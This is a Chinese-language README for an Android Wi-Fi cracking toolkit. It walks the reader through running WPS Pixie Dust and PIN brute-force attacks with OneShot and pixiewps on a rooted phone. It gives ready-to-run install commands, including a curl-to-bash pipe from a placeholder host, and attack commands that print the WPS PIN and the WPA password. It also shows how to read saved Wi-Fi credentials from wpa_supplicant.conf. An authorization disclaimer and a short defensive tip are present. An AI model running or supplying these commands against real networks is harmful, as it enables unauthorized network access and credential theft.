# WCracking 安卓端

> ⚠️ 仅限对本人拥有或已获书面授权的网络进行安全审计。

## 方案说明

安卓端负责 **主动攻击**（抓取 WPS M1-M7 握手、用还原的 PIN 向 AP 换取 WPA-PSK）。
由于安卓驱动在普通模式下无法进入监听模式，业界通用的做法是使用 **OneShot**
（Python + `wpa_supplicant`），它通过 root 下的 wpa_supplicant 直接与目标 AP 完成 WPS 交换，
**无需监听模式**。这也是比 WPSApp（已停止开源、部分新安卓版本失效）更可靠的路线。

本目录提供：

| 文件 | 说明 |
|------|------|
| `install.sh` | Termux 一键安装脚本（装依赖 + 拉取 OneShot + pixiewps） |
| `WCracking-termux.zip`（由 CI 产出） | Termux 工具包：纯 Python 离线引擎 `core/` + 安装脚本 + 文档（解压即用） |

> 注：`pixiewps`、`wpa-supplicant`、`iw` 等依赖直接由 Termux 提供（`pkg install pixiewps`），
> 无需本仓库交叉编译。

## 前置条件

- 一台 **已 root** 的安卓手机（Magisk / KernelSU）。
- 安装 [Termux](https://termux.dev/)（建议 F-Droid 版，Google Play 版已停更）。
- 目标路由器 **开启 WPS** 且为 WPA2（或 WPA2/WPA3 混合）。

---

## ADB / Shizuku 能否替代 Root？（调研结论）

**结论：不能完整替代，但有一小部分可用能力。** 原因如下：

### Shizuku 的本质

Shizuku 通过 ADB 启动一个以 **`shell` 用户（uid 2000）** 权限运行的 Binder 服务，
把「`adb shell` 能做的事」开放给普通 App。它**不是 root**，仍受三层限制：
SELinux 策略、Linux UID/组检查、Android 版本与 OEM 定制限制。

### 为什么它跑不了 Pixie Dust 主动攻击

OneShot 的核心三步需要的权限，`shell` 用户都不具备：

| 步骤 | 需要的权限 | shell 用户（Shizuku）能否做到 |
|------|-----------|------------------------------|
| 操控 `wpa_supplicant`（WPS EAP 交换） | `wifi` 组（aid 1010）或 root | ❌ 现代安卓 shell 已不在 wifi 组 |
| `iw` 扫描 / `ip link set wlan0 down` | `CAP_NET_ADMIN` | ❌ 需 root |
| 读 `/data/misc/wifi/*`（SELinux `wifi_data_file`） | 特定 SELinux 域 | ⚠️ 视设备/ROM 而定，多数被拦 |

### 免 root 真正能做的（有限）

1. **Shizuku 读已保存的 WiFi 密码**：部分设备上可 `cat /data/misc/wifi/wpa_supplicant.conf`
   或 `wpa_supplicant.conf`，但只能看到**本机已连过**的网络，无法破解新目标的 WPS。
2. **旧隐藏 WifiManager WPS API（反射）**：`WifiManager.startWps()` 在 **Android 6 及以下**
   可用（4.0 起仅 PBC、7.0 起彻底移除）。WPSApp 这类 App 就是靠它，**现代安卓已失效**。
3. **默认 PIN 猜测 App**（如 WPS WPA Tester）：仅靠框架层 connect + 出厂 PIN，只对
   极少数老设备/特定 ROM（如部分 Realme）有效，成功率极低。

### 建议的实际路线（按可靠性排序）

1. **最推荐**：一台便宜的二手可解锁 bootloader 的老安卓（小米/Pixel）+ Magisk，跑 OneShot。
2. **更稳**：Linux 主机（Kali/树莓派）+ USB 无线网卡（监听模式），reaver/bully + 本仓库离线引擎。
3. **纯防御验证（无需攻击）**：既然目标是**你自己的**路由器，直接登录 Web 后台看
   WPS 是否开启、加密是否为 WPA2——即可判断是否易受 Pixie Dust，无需真正破解。

## 安装与使用

### 方式一：一键脚本（推荐）

```bash
# 在 Termux 中执行
curl -sSL https://your-host/install.sh | bash
# 或本地：
bash install.sh
```

### 方式二：手动安装

```bash
pkg update && pkg upgrade -y
pkg install -y root-repo git tsu python wpa-supplicant pixiewps iw openssl
git clone --depth 1 https://github.com/drygdryg/OneShot ~/OneShot
```

### 开始攻击

```bash
# 扫描附近 WPS 网络并启动 Pixie Dust 攻击（-K）
tsudo python ~/OneShot/oneshot.py -i wlan0 -K

# 指定 BSSID
tsudo python ~/OneShot/oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K

# 在线 PIN 暴力（指定已知前半段）
tsudo python ~/OneShot/oneshot.py -i wlan0 -b <BSSID> -B -p 1234

# WPS 按钮连接（PBC）
tsudo python ~/OneShot/oneshot.py -i wlan0 --pbc
```

成功后 OneShot 会打印 `[+] WPS PIN` 与 `[+] WPA PSK`（即 Wi-Fi 密码）。

## 常见问题

| 现象 | 处理 |
|------|------|
| `Device or resource busy (-16)` | 关掉系统 Wi-Fi，或加 `--iface-down`，重试几次 |
| `RTNETLINK answers: Operation not possible due to RF-kill` | `tsudo rfkill unblock wifi` |
| MediaTek 机型 `wlan0` 消失 | 关 Wi-Fi 后用 `--mtk-wifi` 参数 |

## 本机离线引擎联动

如果你只拿到握手数据（PKe/PKr/Hash1/Hash2/AuthKey/Nonce），
可以直接丢给本仓库的离线引擎（PC 或 Termux 内的 Python）：

```bash
python core/pixie_dust.py --pke ... --pkr ... --e-hash1 ... --e-hash2 ... --authkey ... --e-nonce ...
```

## 原生 APK 路线（规划）

当前 OneShot+Termux 已能完成全部攻击。若需要「无 Termux 的原生 APK 体验」，
需开发一个 Kotlin 壳应用，通过 root shell 调用内置的 OneShot/Pixiewps 二进制，
并用原生 UI 展示结果——这是较大的独立工作量，已在
`.github/workflows/build-android.yml` 中预留了 NDK 编译 pixiewps 二进制与 Gradle 构建的骨架。
